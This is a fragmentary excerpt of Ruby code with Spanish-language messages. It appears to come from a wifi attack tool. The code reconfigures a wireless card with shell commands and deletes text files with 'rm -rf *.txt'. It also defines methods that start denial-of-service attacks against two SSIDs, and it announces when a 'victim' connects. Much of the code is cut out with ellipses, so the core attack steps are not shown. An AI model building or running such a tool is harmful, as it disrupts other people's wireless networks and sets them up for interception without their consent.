...
sleep 1
`rm -rf *.txt`
puts "Re-iniciando la tarjeta wifi..."
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
`iw dev wlan1 set type managed`
...
def self.activeDos
puts "La DoS encontra SSID1 empeza..."
...
def self.dosBis
puts "La DoS encontra SSID2 empeza..."
...
puts "\e[1;32m[*] Victima del SSID 1 conectado\e[0m"
load 'historique.rb'
puts $apmac
...
puts "\e[1;32m[*] Victima del SSID 2 conectado\e[0m"
